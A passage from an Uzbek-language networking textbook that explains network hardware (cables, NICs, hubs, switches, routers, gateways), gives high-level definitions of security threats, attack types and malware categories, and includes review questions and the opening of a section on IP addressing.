tarmoq kabeli, hab (konsentrator), repitir, tarmoq kartasi, ko‘prik, switch (kommutatot), router (marshrutizator), gateway (shlyuz), zaiflik, tahdid, hujum, tug‘ma texnologik zaidlik, ichki tahdid, tashqi tahdid, razvedka hujumlari, kirish hujumlari, DOS hujumlari, zararli dasturlar.
Kalit so‘zlar:
tarmoq kabeli, hab (konsentrator), repitir, tarmoq kartasi, ko‘prik, switch (kommutatot), router (marshrutizator), gateway (shlyuz), zaiflik, tahdid, hujum, tug‘ma texnologik zaidlik, ichki tahdid, tashqi tahdid, razvedka hujumlari, kirish hujumlari, DOS hujumlari, zararli dasturlar.
Kalit so‘zlar:
Tarmoq qurilmalari: tarmoq kabeli, hab, repitir, tarmoq kartasi, ko‘prik, switch, router, gateway
Tarmoq kabeli
Axborot о‘tazish muhiti deb - kompyuterlar о‘rtasida axborot almashinuvini taminlovchi axborot yо‘llariga (yoki aloqa kanallariga) aytiladi. Kо‘pchilik kompyuter tarmoqlarida (ayniqsa lokal tarmoqlarda) simli yoki kabelli aloqa kanallari ishlatiladi. Bundan tashqari, simsiz tarmoqlar ham mavjuddir.
Kabel ishlab chiqaruvchi sanoat korxonalari kabel turlarini kо‘p miqdorda ishlab chiqaradilar. Hamma ishlab chiqariladigan kabellarni uch turga bо‘lish mumkin: 
	•	о‘ralgan juft simli kabel (витая пара, twisted pair), ular himoyalangan ya’ni ekranlashtiriladi (экранированные, shielded twisted pair, stop) va himoyalanmagan ya’ni ekranlashtirilmagan (неэкранированные, unshielded twisted pair, UTP);
	•	koaksial kabellar (coaxial cable);  
	•	optik tolali kabellar (оптоволоконные кабели, fiber optic). 
Kabelning xar bir turining о‘z afzalliklari va kamchiliklari mavjuddir, shuning uchun kabel turini tanlanganda hal qilinayotgan masalaning xususiyatini inobatga olish lozim.
О‘ralgan juft simlar xozirgi kunda eng arzon va eng kо‘p tarqalgan kabellarda ishlatiladi. О‘ralgan juftlik asosidagi kabel tuzilishi ikkita mis sim dielektrik material bilan har biri alohida qoplanib, ular о‘zaro bir-biriga о‘ralgan, bunday juftliklarning bir nechtasi umumiy dielektrik (plastikli) g‘ilofga olingan bо‘ladi. U ancha egiluvchan va uni aloqa kanaliga yotqizish qulaydir. Odatda о‘ralgan juftlik kabel tarkibida 2 ta yoki 4 ta juftlikdan iborat bо‘ladi (6.1-rasm “a”). Hozirgi vaqtda о‘ralgan juftliklardan 100 Mbit/s tezlikda axborot uzatish uchun ishlatilmoqda va uzatish tezligini 1000 Mbit/s ga yetkazish ustida ish olib borilmoqda. 
Koaksial kabel elektr toki о‘tkazuvchi kabel bо‘lib, tuzulishi 6.1–rasm “b” da  kо‘rsatilgandek markaziy mis sim ichki dielektrik qoplamaga olingan bо‘lib metal sim tо‘qimaga (ekran) о‘ralgan, hamda u umumiy tashqi qoplamaga olingan bо‘ladi. 
Yaqin vaqtgacha koaksial kabellar eng kо‘p tarqalgan kabellar edi, buning sababi yuqori darajada himoyalanganligi (sim tо‘qimasi-ekran mavjudligi), tо‘qilgan juftlikka qaraganda axborotni uzatish tezligi (500 Mbit/s gacha) yuqoriligi va katta masofalarga uzatish imkoniyati mavjudligi (bir va undan kо‘proq kilometrga). Shuningdek, tarmoqdan ruxsat etilmagan axborotni mexanik ulanish orqali olish qiyinligi, u tashqariga sezilarli darajada kam elektromagnit nurlanish tarqatishi kabilar. Biroq, о‘ralgan juftli kabelga nisbatan koaksial kabelni tamirlash va yig‘ish ishlarini olib borish ancha murakkabdir, narxi ham qimmat (uning narxi о‘ralgan juftli kabellarga nisbatan 1,5 – 3 barobar yuqoridir). Kabel uchlariga razyomlar о‘rnatish ham murakkab ishdir. Shuning uchun bu turdagi kabellarni о‘ralgan juftli kabellarga qaraganda kam ishlatiladi.
Optik tolali kabel – bu yuqorida kо‘rib chiqilgan ikki kabel turlaridan tubdan farqlanuvchi kabel. Bu kabel turida axborot elektr signali kо‘rinishda emas, yorug‘lik kо‘rinishida uzatiladi. Bu turdagi kabelning asosiy elementi – shaffof shisha tola bо‘lib, u orqali yorug‘lik juda katta masofalarga (о‘nlab kilometrgacha) kam (sezilarsiz) sо‘nish bilan uzatiladi. 
	Optik tolaning tuzilishi juda oddiy bо‘lib u koaksial elektr kabel tuzilishiga о‘xshash (2.7–rasm “c”). Faqat markaziy mis sim о‘rniga bu kabel turida ingichka (diametri 1 – 10 mkm atrofida) shisha tola ishlatilgan, ichki himoya qoplama о‘rniga esa, yorug‘likni shisha tola tashqarisiga tarqatmaydigan shisha yoki plastik qoplamadan foydalanilgan.  Optik tolalar kabellarda ma’lumotlarni 10 Gbit/s gacha tezlikda uzatish mumkin.




a) O‘ralgan juft kabel
b) Koaksial kabel
c) Optik kabel
2.7-rasm. Tarmoq kabel turlari
Tarmoq kartasi
Tarmoq interfeysi kartasi (Network interface card, NIC) yoki tarmoq kartasi - bu kompyuterning tarmoqqa ulanishini ta’minlash uchun o‘rnatiladigan apparat komponenti bo‘lib, odatda mikrosxema yoki plata shaklida bo‘ladi. NIC (tarmoq interfeysi kartasi) atamasi network interface controller, network adapter, yoki LAN (local area network) adapter atamalari bilan bir xil ma’noda ishlatiladi. Qaysi atama ishlatilishidan qatiy nazar, NICning asosiy vazifasi — kompyuterning tarmoqqa ulanishiga imkon yaratish va tarmoqdagi qurilmalar o‘rtasida muloqot hamda resurs almashuvini ta’minlashdir. NIClar tarmoq va qurilma o‘rtasida paketlarni uzatadi va qabul qiladi. Ular ma’lumotlarni analogdan raqamli shaklga (tarmoqdan qurilmaga), raqamli shakldan analogga (qurilmadan tarmoqqa) aylantiradi (2.8-rasm).




a) Kabelli NIC
b) Simsiz NIC
c) USB NIC
2.8-rasm. NIC turlari
Tarmoq kontsentratori yoki Hab
Tarmoq kontsentratori (shuningdek, hab, inglizcha hub - “markaz”) - Ethernet tarmoqlarida kompyuterlarni ulash uchun mo‘ljallangan qurilmalar sinfi bo‘lib, u o‘rama juft (twisted pair) kabel infratuzilmasidan foydalanadi. Hozirgi kunda ularni deyarli to‘liq tarmoq kommutatorlari (switch) almashtirgan. Tarmoq kontsentratоrlari ba’zan mavjud tarmoq segmentlariga ulanish uchun qalin yoki yupqa koaksial kabel uchun mo‘ljallangan ulagichlarga ham ega bo‘lgan (2.9-rasm).

2.9-rasm.  Hab qurilmasi
Kontsentrator OSI modelining 1-qatlami — fizik qatlam darajasida ishlaydi va bir portdan kelgan signalni qolgan barcha (ulangan) portlarga qayta uzatadi. Shu sababli, ko‘p portli hablarda fizik jihatdan “yulduz” topologiyasi hosil qilingan bo‘lsa ham (ya’ni bir nechta tarmoq segmentlari kabellar orqali habga ulanadi), mantiqan tarmoq hanuz birgalikdagi umumiy muhitda (“umumiy shina” topologiyasi) ishlaydi, bu esa Ethernet uchun xos holatdir: tarmoq o‘tkazuvchanligi barcha qurilmalar o‘rtasida bo‘linadi, ma’lumot uzatish yarim dupleks rejimida amalga oshiriladi.

Kommutator yoki switch
Tarmoq kommutatori (jargonda switch, inglizcha switch) - bu kompyuter tarmog‘ining bir yoki bir nechta segmentlari ichida bir nechta tugunlarni (qurilmalarni) o‘zaro ulash uchun mo‘ljallangan qurilma. Kommutator OSI modelining kanal sathida ishlaydi. Kommutatorlar ko‘prik (bridge) texnologiyalariga asoslangan holda yaratilgan va ko‘pincha ko‘pportli ko‘priklar sifatida qaraladi. Bir nechta tarmoqlarni OSI modelining tarmoq sathi asosida ulash uchun esa marshrutizatorlar xizmat qiladi (2.10-rasm).

2.10-rasm. Cisco® Catalyst® 2960-X va 2960-XR Seriyali switch qurilmasi
OSI modelining 1-sathida ishlovchi konsentrator (hub) dan farqli ravishda (u bitta qurilmadan kelgan trafikni barcha portlarga uzatadi), kommutator ma’lumotlarni faqat bevosita mo‘ljallangan qabul qiluvchiga uzatadi.  Bu esa tarmoqning unumdorligi va xavfsizligini oshiradi, chunki boshqa segmentlar o‘zlariga mo‘ljallanmagan ma’lumotni qabul qilib, uni qayta ishlashga hojat qolmaydi (va bunga ruxsat ham bo‘lmaydi).
Repitir
Repitir (inglizcha repeater) - bu tarmoq uskunasi bo‘lib, tarmoq ulanishining masofasini oshirish, uni bitta segmentdan tashqariga kengaytirish yoki ikki tarmoqli yo‘nalishni tashkil qilish uchun elektr signalini “bir xil ko‘rinishda takrorlash” orqali ishlaydi. Repitirlar bir portli yoki ko‘p portli bo‘lishi mumkin. OSI modeliga ko‘ra, ular fizik qatlamda ishlaydi. Ushbu qurilma signalni kuchaytirishni emas, balki takrorlashni (regeneratsiya) bajaradi. Bunda qurilma kirish qismida signalni qabul qiladi, keyin uning asl ko‘rinishini aniqlaydi va chiqishda uning aniq nusxasini qayta yaratadi. Nazariy jihatdan bunday sxema (Ethernetning fizik muhit bo‘linishi cheklovlarini hisobga olmaganda) ma’lumotni juda uzoq masofalarga uzatish imkonini beradi (2.11-rasm).

2.11-rasm. POR-0103 PoE+ repitir qurilmasi
Ushbu qurilma dastlab Ethernetda koaksial kabel va “shinа” (bus) topologiyasi ishlatilgan va faqat bir nechta uzun segmentlarni o‘zaro ulash uchun ishlatilgan. Buning uchun odatda ikki portli repitirdan foydalanilgan. Keyinchalik ko‘p portli qurilmalar - konsentratorlar (hub) paydo bo‘ldi. Ularning fizik vazifasi xuddi o‘sha, biroq tiklangan signal faqat kelgan portdan tashqari barcha faol portlarga uzatiladi.
Ko‘prik
Ko‘prik (inglizcha bridge) - OSI modelining ikkinchi (kanal) sathida ishlovchi tarmoq qurilmasi. U kompyuter tarmog‘ining segmentlari (kichik tarmoqlari)ni bitta yagona tarmoqqa birlashtirish uchun mo‘ljallangan. Tarmoqdan freym (paket) kelib tushganda, ko‘prik uning sarlavhasidagi MAC-manzilni tekshiradi. Agar mazkur MAC-manzil ushbu kichik tarmoqqa tegishli bo‘lsa, most freymni to‘g‘ri segmentga uzatadi. Agar freym ushbu kichik tarmoqqa tegishli bo‘lmasa, ko‘prik hech qanday amal bajarmaydi (2.12-rasm).
Ko‘prik bilan kommutator o‘rtasidagi farq: ko‘prik har bir vaqtda faqat bitta freym oqimini va faqat ikki port orasida uzata oladi; kommutator (switch) esa bir vaqtning o‘zida o‘zidagi istalgan portlar o‘rtasida bir nechta ma’lumot oqimlarini uzata oladi. Boshqacha aytganda, ko‘prik freymlarni ketma-ket, kommutator esa parallel tarzda uzatadi.


2.12-rasm. N2200/N2250 tarmoq ko‘prigi
Ko‘priklar asosan lokal tarmoqlarni global tarmoqlar bilan bog‘lashda ishlatiladi. Bunday hollarda kommutatorlardagi kabi bir vaqtning o‘zida bir nechta port juftliklari o‘rtasida parallel uzatish zarurati bo‘lmagani uchun mostlar yetarli bo‘ladi.
Router yoki marshrutizator
Marshrutizator (shuningdek, router) - bu turli yo‘nalish qoidalari va marshrutlash jadvallariga asoslanib, tarmoq segmentlari o‘rtasida paketlarni uzatadigan maxsus qurilma. Marshrutizator turli arxitekturadagi, bir-biridan farq qiladigan tarmoqlarni ham o‘zaro bog‘lay oladi. Paketlarni qayerga yuborish bo‘yicha qaror qabul qilishda tarmoq topologiyasi haqidagi ma’lumotlar va administrator tomonidan belgilangan qoidalar ishlatiladi. Marshrutizatorlar OSI modelining 3-sathi (tarmoq)da ishlaydi. Bu jihatdan ular OSI modelining 2-sathida ishlaydigan kommutatorlardan (switchlardan) va 1-darajada ishlaydigan konsentrator (hub)lardan farq qiladi. Odatda marshrutizator paket sarlavhasida ko‘rsatilgan qabul qiluvchining IP manziliga qaraydi va marshrutlash jadvaliga muvofiq ma’lumot qaysi yo‘l bilan uzatilishini aniqlaydi. Agar marshrutlash jadvalida ushbu manzil uchun yo‘l ko‘rsatilmagan bo‘lsa, paket tashlab yuboriladi (2.13-rasm).
Paketlarni uzatish marshrutini aniqlashning boshqa usullari ham mavjud. Masalan, ayrim hollarda jo‘natuvchining manzili, yuqori darajadagi protokollar yoki tarmoq darajasidagi paket sarlavhalarida joylashgan boshqa ma’lumotlardan foydalaniladi. Ko‘pincha marshrutizatorlar qo‘shimcha funksiyalarni ham bajaradi: jo‘natuvchi va qabul qiluvchi manzillarini tarjima qilish (NAT), ma’lum qoidalarga asoslanib uzatiluvchi ma’lumotlarni filtrlash (kirish-chiqish nazorati), uzatiladigan ma’lumotlarni shifrlash / deshifrlash, xavfsizlikni ta’minlash uchun trafikni boshqarish va boshqalar.

2.13-rasm. CISCO ISR 4321 routeri
Gateway yoki shlyuz
Har bir kompaniya lokal axborot tizimi xavfsizligi, qurilmalar o‘rtasida barqaror ulanish, xodimlar uchun internetga muammosiz ulanish va tarmoqdagi barcha trafikni nazorat qilish kabi imkoniyatlarni ta’minlash lozim. Ushbu vazifalarni gateway (web-xavfsizlik shlyuzlari) turidagi qurilmalar yordamida hal qilish mumkin. 
Bu maxsus vositalar bo‘lib, tarmoq qurilmalari yoki turli tarmoqlar o‘rtasidagi o‘zaro aloqani tashkil qilishga mo‘ljallangan. Ular apparat yoki dasturiy ta’minot ko‘rinishida bo‘lishi mumkin. Birinchi turdagi shlyuzlar — fizik qurilma (masalan, marshrutizator), bunda zarur bo‘lgan barcha apparat va dasturiy ta’minot mavjud. Bu ko‘rinish gateway sinfidagi yechimlar mavjud bo‘lmagan infratuzilmalarda mos keladi. Dasturiy yechimlar mavjud uskuna ustiga o‘rnatiladi va bu administratorlardan maxsus ko‘nikmalarni talab qiladi. Bundan tashqari, ba’zi apparat yechimlar bilan mos kelmasligi sababli, dasturiy yechimlarda ayrim funksiyalar bo‘lmasligi mumkin.
Shlyuz turlari:
Tarmoq shlyuzi — tarmoqdagi ma’lum bir nuqta (node) bo‘lib, boshqa tarmoqqa “portal” vazifasini bajaradi, tarmoq modelining pastki sathlarida ishlaydi (3-4). Misol: ichki tarmoq va global tarmoq orasidagi trafikni nazorat qiluvchi server.
Kompaniyalar uchun internet-shlyuz — asosiy vazifasi ilovalar sathida (7), ko‘pincha HTTP(S) protokoli orqali trafikni boshqarish. Bunday yechimlar foydalanuvchilarning turli web-resurslardan foydalanishini taqsimlash va cheklash uchun ishlatiladi.
Oraliq gateway — tunel zanjirlarini qo‘llab-quvvatlaydigan marshrutizator yoki operatsion tizim.
Shuningdek, turli protokollar ishlatiladigan tarmoq sohalari o‘rtasida ulanishni ta’minlaydigan shlyuzlar mavjud. Ko‘pincha bunday vazifani switch, kommutator va marshrutizatorlar bajaradi.
Tarmoq xavfsizligi muammolari
Axborot, Internet va kompyuter xavfsizligida aksariyat foydalanuvchilar tahdid, zaiflik va hujum tushunchalaridan tez-tez foydalanadilar. Biroq, aksariyat foydalanuvchilar tomonidan ularni almashtirish holatlari kuzatiladi. 
Zaiflik  – “portlaganida” tizim xavfsizligini buzuvchi kutilmagan va oshkor bo‘lmagan hodisalarga olib keluvchi kamchilik, loyihalashdagi yoki amalga oshirishdagi xatolik.
Tahdid (axborot xavfsizligiga tahdid) - axborot xavfsizligini buzuvchi bo‘lishi mumkin bo‘lgan yoki real mavjud xavfni tug‘diruvchi sharoitlar va omillar majmui.
Hujum – bosqinchining operatsion muhitini boshqarishiga imkon beruvchi axborot tizimi xavfsizligining buzilishi.
Hozirda tarmoq orqali amalga oshiriluvchi masalalarning ortishiga quyidagi omillar sabab bo‘lmoqda:
Qurilma yoki dasturiy vositaning noto‘g‘ri sozlanishi. Xavfsizlik bo‘shliqlari, odatda, tarmoqdagi qurilma yoki dasturiy vositalarning noto‘g‘ri sozlangani bois vujudga keladi. Masalan, noto‘g‘ri sozlangan yoki shifrlash mavjud bo‘lmagan protokoldan foydalanish tarmoq orqali yuboriluvchi maxfiy ma’lumotlarning oshkor bo‘lishiga sababchi bo‘lishi mumkin. 
Tarmoqni xavfsiz bo‘lmagan tarzda va zaif loyihalash. Noto‘g‘ri va xavfsiz bo‘lmagan holda loyihalangan tarmoq turli tahdidlarga va ma’lumotlarning yo‘qotilishi ehtimoliga duch kelishi mumkin. Masalan, agar tarmoqlararo ekran, IDS va virtual shaxsiy tarmoq (VPN) texnologiyalari xavfsiz tarzda amalga oshirilmagan bo‘lsa, ular tarmoqni turli tahdidlar uchun zaif qilib qo‘yishi mumkin. 
Tug‘ma texnologik zaiflik. Agar qurilma yoki dasturiy vosita ma’lum turdagi tarmoq hujumlarini bartaraf eta olmasa, u ushbu hujumlarga zaif bo‘ladi. Masalan, agar tizimlarda foydalanilgan web brauzer yangilanmagan bo‘lsa, u taqsimlangan hujumlarga ko‘proq bardoshsiz bo‘ladi. 
Foydalanuvchilarning e’tiborsizligi. Eng oxirgi tarmoq foydalanuvchilarining e’tiborsizligi tarmoq xavfsizligiga jiddiy ta’sir qilishi mumkin. Inson harakatlari natijasida ma’lumotlarning yo‘qolishi, sirqib chiqishi kabi jiddiy xavfsizlik muammolari paydo bo‘lishi mumkin. 
Foydalanuvchilarni qasddan qilgan harakatlari. Xodim ishdan bo‘shab ketgan bo‘lsada, taqsimlangan diskdan foydalanish imkoniyatiga ega bo‘lishi mumkin. U mazkur holda tashkilot maxfiy axborotini chiqib ketishiga sababchi bo‘lishi mumkin. Bu holatga foydalanuvchilarning qasddan qilgan harakatlari sifatida qaraladi.
Tarmoq xavfsizligiga tahdid turlari. Tarmoqqa qaratilgan tahdidlar odatda ikki turga ajratiladi (2.14-rasm):
	•	ichki tahdidlar;
	•	tashqi tahdidlar.
Ichki tahdidlar. Kompyuter yoki Internetga aloqador jinoyatchiliklarning 80% ini ichki hujumlar tashkil etadi. Bu hujumlar tashkilot ichidan turib, xafa bo‘lgan xodimlar yoki g‘araz niyatli xodimlar tomonidan amalga oshirilishi mumkin. Ushbu hujumlarning aksariyati imtiyozga ega tarmoq foydalanuvchilari tomonidan amalga oshiriladi. 
Tashqi tahdidlar. Tashqi hujumlar tarmoqda allaqachon mavjud bo‘lgan zaiflik natijasida amalga oshiriladi. Hujumchi shunchaki qiziqishga, moddiy foyda yoki tashkilotni obro‘sini tushirish uchun ushbu hujumlarni amalga oshirishi mumkin. Mazkur holda hujumchi yuqori malakali va guruh bo‘lib hujumni amalga oshirishi mumkin. 
Tashqi tahdidlar odatda ikki turga ajratiladi: tizimlashgan va tizimlashmagan tashqi tahdidlar (2.14-rasm). Tizimlashgan tashqi tahdidlar yuqori malakali shaxslar tomonidan amalga oshiriladi. Ushbu shaxslar tarmoqdagi mavjud zaifliklarni tezkorlik bilan aniqlash va undan o‘z maqsadlari yo‘lida foydalanishlari uchun imkoniyatga ega bo‘ladilar. Tizimlashmagan tashqi tahdidlar odatda malakali bo‘lmagan shaxslar tomonidan turli tayyor buzish vositalari va skriptlar (senariylar) yordamida amalga oshiriladi. Ushbu hujum turlari odatda shaxs tomonidan o‘z imkoniyatini testlash yoki tashkilotda zaiflik mavjudligini tekshirish uchun amalga oshiriladi. 

2.14-rasm. Tarmoqqa qaratilgan turli tahdidlar
	Tarmoqqa qaratilgan hujumlar sonini ortib borishi natijasida tashkilotlar o‘z tarmoqlarida xavfsizlikni ta’minlashda qiyinchiliklarga duch kelishmoqda. Bundan tashqari, hujumchilarning yoki xakerlarning tarmoqdan foydalanishini yangidan - yangi usullaridan foydalanishlari, ular motivlarining turlichaligi bu murakkablikni yanada oshiradi.  Tarmoq hujumlari odatda quyidagicha tasniflanadi.
Razvedka hujumlari. Razvedka hujumlari asosiy hujumni oson amalga oshirish maqsadida tashkilot va tarmoq haqidagi axborotni to‘playdi va bu hujumchilarga mavjud bo‘lishi mumkin bo‘lgan zaifliklarni aniqlash imkonini beradi.
Razvedka hujumining asosiy maqsadi quyidagi toifaga tegishli ma’lumotlarni yig‘ish hisoblanadi:
	•	tarmoq haqidagi;
	•	tizim haqidagi;
	•	tashkilot haqidagi.
Razvedka hujumlarining quyidagi turlari mavjud:
	•	Aktiv razvedka hujumlari. Aktiv razvedka hujumlari asosan portlarni va operatsion tizimni skanerlashni maqsad qiladi. Buning uchun, hujumchi maxsus dasturiy vositalardan foydalangan holda, turli paketlarni yuboradi. Masalan, maxsus dasturiy vosita router va tarmoqlararo ekranga boruvchi barcha IP manzillarni to‘plashga yordam beradi.
Passiv razvedka hujumlari. Passiv razvedka hujumlari trafik orqali axborotni to‘plashga harakat qiladi. Buning uchun hujumchi sniffer deb nomlanuvchi dasturiy vositadan foydalanadi. Bundan tashqari, hujumchi ko‘plab vositalardan foydalanishi mumkin.
Kirish hujumlari. Mo‘ljaldagi tarmoq haqida yetarlicha axborot to‘planganidan so‘ng, hujumchi turli texnologiyalardan foydalangan holda tarmoqqa kirishga harakat qiladi. Ya’ni, tizim yoki tarmoqni boshqarishga harakat qiladi. Bu turdagi hujumlar kirish hujumlari deb ataladi. Bularga ruxsatsiz foydalanish, qo‘pol kuch hujumi, imtiyozni orttirish, o‘rtada turgan odam hujumi va boshqalarni misol sifatida keltirish mumkin.
Parolga qaratilgan hujumlar. Parolga qaratilgan hujumlar nishondagi kompyuter tizimi uchun nazoratni qo‘lga kiritish yoki ruxsatsiz foydalanish maqsadida amalga oshiriladi. Parolga qaratilgan hujumlar maxfiy kattaliklarni o‘g‘irlashni maqsad qiladi. Buning uchun turli usul va vositalardan foydalaniladi. Keng tarqalgan hujumlarga quyidagilar misol bo‘la oladi:
	•	lug‘atga asoslangan hujum;
	•	qo‘pol kuch hujumi yoki barcha variantlarni to‘liq tanlash hujumi;
	•	gibrid hujum (lug‘atga va qo‘pol kuch hujumlariga asoslangan);
	•	Rainbow jadvali hujumlari (oldindan hisoblangan keng tarqalgan parollarning xesh qiymatlari saqlanuvchi jadvallar).
O‘rtada turgan odam hujumi. O‘rtada turgan odam (Man in the middle attack, MITM) hujumida hujumchi o‘rnatilgan aloqaga suqilib kiradi va aloqani uzadi. Bunda nafaqat tomonlar o‘rtasida almashinadigan ma’lumotlarga, balki, soxta xabarlarni ham yuborish imkoniyatiga ega bo‘ladi. MITM hujumi yordamida hujumchi real vaqt rejimidagi aloqani, so‘zlashuvlarni yoki ma’lumotlar almashinuv jarayonini boshqarishi mumkin. 
Xizmatdan voz kechishga undash (Denial of service, DOS) hujumlari. Xizmatdan voz kechishga qaratilgan hujumlarda hujumchi mijozlarga, foydalanuvchilarga tashkilotlarda mavjud bo‘lgan biror xizmatni cheklashga urinadi. DOS hujumlari biror axborotning o‘g‘irlanishiga yoki yo‘qolishiga olib kelmasada, tashkilot funksiyasini bajarilmasligiga sababchi bo‘ladi. DOS hujumlari tizimda saqlangan fayllar va boshqa maxfiy ma’lumotlarga, hattoki web-saytning ishlashiga ham ta’sir qiladi. Ushbu hujum bilan web-sayt faoliyatini to‘xtatib qo‘yish mumkin.
Taqsimlangan DOS hujumlar: (Distributed DOS, DDOS). DDOS keng qamrovli nishondagi tizim va tarmoq resurlarida xizmatdan foydalanishni buzishga qaratilgan hujum bo‘lib, Internetdagi ko‘plab zombi kompyuterlar orqali bilvosita amalga oshiriladi. Bunda, hujum ostidagi xizmatlar asosiy nishon deb qaralib, tizimlarni obro‘sizlantirish (zombi holatiga olib kelish) ikkilamchi nishon deb qaraladi. 
Zararli hujumlar. Zararli hujumlar tizim yoki tarmoqqa bevosita va bilvosita ta’sir qiladi. Zararli dastur – fayl bo‘lib, kompyuter tizimiga tahdid qilish imkoniyatiga ega va troyanlar, viruslar, “qurt”lar ko‘rinishida bo‘lishi mumkin. 
Zararli dasturiy vositalari foydalanuvchining ruxsatisiz hujumchi kabi g‘arazli amallarni bajarishni maqsad qilgan vosita hisoblanib, ular yuklanuvchi kod (.exe), aktiv kontent, skript yoki boshqa ko‘rinishda bo‘lishi mumkin. Hujumchi zararli dasturiy vositalardan foydalangan holda tizim xafsizligini obro‘sizlantirishi, kompyuter amallarini buzishi, maxfiy axborotni to‘plashi, web saytdagi kontentlarni modifikatsiyalashi, o‘chirishi yoki qo‘shishi, foydalanuvchi kompyuteri boshqaruvini qo‘lga kiritishi mumkin. Bundan tashqari, zararli dasturlardan hukumat tashkilotlaridan va korporativ tashkilotlardan katta hajmdagi maxfiy axborotni olish uchun ham foydalanish mumkin. Zararli dasturlarning hozirda quyidagi ko‘rinishlari keng tarqalgan:
	•	viruslar: o‘zini o‘zi ko‘paytiradigan dastur bo‘lib, o‘zini boshqa dastur ichiga, kompyuterning yuklanuvchi sektoriga yoki hujjat ichiga biriktiradi;
	•	troyan otlari: bir qarashda yaxshi va foydali kabi ko‘rinuvchi dasturiy vosita sifatida o‘zini ko‘rsatsada, yashiringan zararli koddan iborat;
	•	adware: marketing maqsadida yoki reklamani namoyish qilish uchun foydalanuvchi faoliyatini kuzatib boruvchi dasturiy ta’minot;
	•	spyware: foydalanuvchi ma’lumotlarini qo‘lga kirituvchi va uni hujumchiga yuboruvchi dasturiy kod;
	•	rootkits: ushbu zararli dasturiy vosita operatsion tizim tomonidan aniqlanmasligi uchun o‘z harakatlarini yashiradi;
	•	backdoors: zararli dasturiy kodlar bo‘lib, hujumchiga autentifikatsiyani amalga oshirmasdan, aylanib o‘tib tizimga kirish imkonini beradi, masalan, ma’mur parolisiz imtiyozga ega bo‘lish;
	•	mantiqiy bombalar: zararli dasturiy vosita bo‘lib, biror mantiqiy shart qanoatlantirilgan vaqtda o‘z harakatini amalga oshiradi;
	•	botnet: Internet tarmog‘idagi obro‘sizlantirilgan kompyuterlar bo‘lib, taqsimlangan hujumlarni amalga oshirish uchun hujumchi tomonidan foydalaniladi;
	•	ransomware: mazkur zararli dasturiy ta’minot qurbon kompyuterida mavjud qimmatli fayllarni shifrlaydi yoki blokirovkalab, to‘lov amalga oshirilishini talab qiladi.
	Tarmoq kabellari turlarini, ularni xususiyatlarini ayting?
	•	Tarmoq kartasi qurilmasining vazifasi, ko‘rinishlarini ayting?
	•	Tarmoq konsentratori yoki hab qurilmasi haqida ma’lumot bering?
	•	Kommutator yoki switch qurilmasi haqida ma’lumot bering?
	•	Repitir, ko‘prik qurilmalari haqida ma’lumot bering?
	•	Router yoki marshrutizator qurilmasi haqida ma’lumot bering?
	•	Gateway yoki shlyuz vositasi haqida ma’lumot bering?
	•	Tarmoq xavfsizligining muammolari: zaiflik, tahdid va hujum tushunchalarini ayting?
	•	Ichki va tashqi tahdidlar haqida ma’lumot bering?
	•	 Razvedka hujumlari haqida ma’lumot bering?
	•	 Kirish hujumlari, ularning maqsadi haqida ma’lumot bering?
	•	 Zararli dasturlar va ularning turlari haqida ma’lumot bering?
	•	 DoS/DDoS hujumi, uning maqsadini tushuntiring?

Nazorat savollari

	•	Tarmoq kabellari turlarini, ularni xususiyatlarini ayting?
	•	Tarmoq kartasi qurilmasining vazifasi, ko‘rinishlarini ayting?
	•	Tarmoq konsentratori yoki hab qurilmasi haqida ma’lumot bering?
	•	Kommutator yoki switch qurilmasi haqida ma’lumot bering?
	•	Repitir, ko‘prik qurilmalari haqida ma’lumot bering?
	•	Router yoki marshrutizator qurilmasi haqida ma’lumot bering?
	•	Gateway yoki shlyuz vositasi haqida ma’lumot bering?
	•	Tarmoq xavfsizligining muammolari: zaiflik, tahdid va hujum tushunchalarini ayting?
	•	Ichki va tashqi tahdidlar haqida ma’lumot bering?
	•	 Razvedka hujumlari haqida ma’lumot bering?
	•	 Kirish hujumlari, ularning maqsadi haqida ma’lumot bering?
	•	 Zararli dasturlar va ularning turlari haqida ma’lumot bering?
	•	 DoS/DDoS hujumi, uning maqsadini tushuntiring?

Nazorat savollari
2.3. IP-manzillash va qismtarmoqlar (subnets)  (Ma’ruza mashg‘uloti)
IPv4/ IPv6 tarmoq protokoli.
	•	Qism tarmoq maskalari va tarmoq segmentatsiyasi. 
	•	IP manzillari guruhlari. 
	•	IP manzillarni tarqatish.
Reja:
	•	IPv4/ IPv6 tarmoq protokoli.
	•	Qism tarmoq maskalari va tarmoq segmentatsiyasi. 
	•	IP manzillari guruhlari. 
	•	IP manzillarni tarqatish.
Reja:

IP manzil, TCP/IP, UDP, NAT, qism tarmoq maskasi (subnet mask), tarmoq segmentatsiyasi, IP tarmoq guruhlari, CIDR, IANA, RIR, lokal operatorlar.
Kalit so‘zlar:
IP manzil, TCP/IP, UDP, NAT, qism tarmoq maskasi (subnet mask), tarmoq segmentatsiyasi, IP tarmoq guruhlari, CIDR, IANA, RIR, lokal operatorlar.
Kalit so‘zlar:
IPv4/ IPv6 tarmoq protokoli
IPv4 va IPv6 – bu IP protokoli bo‘yicha manzillash tizimining ikki versiyasi. IP protokoli Internet orqali ma’lumot uzatishni tartibga soluvchi qoidalar to‘plamini belgilaydi. Internet mohiyatiga ko‘ra – bu tarmoq bo‘lib, milliardlab qurilmalarni birlashtiradi va ular tarmoq texnologiyalari yordamida ma’lumot almashadi. IP protokoli har bir ulanadigan qurilmaga noyob identifikator, IP-manzil beradi. 
IPv4 versiyasida 32-bitli manzillar ishlatiladi, bu esa 4 milliarddan ortiq mumkin bo‘lgan manzillarni ta’minlaydi. Biroq, ayniqsa buyumlar internet (Internet of Things, IoT) doirasida ulanadigan qurilmalar sonining tez o‘sishi hisobiga, IPv4 manzillari diapazoni yetarli bo‘lmay qoldi. Shu sababli u asta-sekin IPv6 versiyasi bilan almashtirilmoqda. Ushbu versiyada 128-bitli manzil formati ishlatiladi, bu esa 10³⁶ dan ortiq manzillarni qo‘llab-quvvatlash imkonini beradi.
IPv4 va IPv6 protokol versiyalarining asosiy funksiyasi shundan iboratki, Internet orqali yuborilayotgan ma’lumotlar tarmoq infratuzilmasi qanday bo‘lmasin, kerakli qurilmaga yetkazilishi ta’minlanadi. Marshrutizatsiya (paketlar uchun optimal yo‘lni aniqlash) Internetdagi barcha kommunikatsiyalarning asosiy texnologiyasi hisoblanadi. Quyidagi protokol versiyalarining ba’zi o‘xshashliklari keltiriladi.
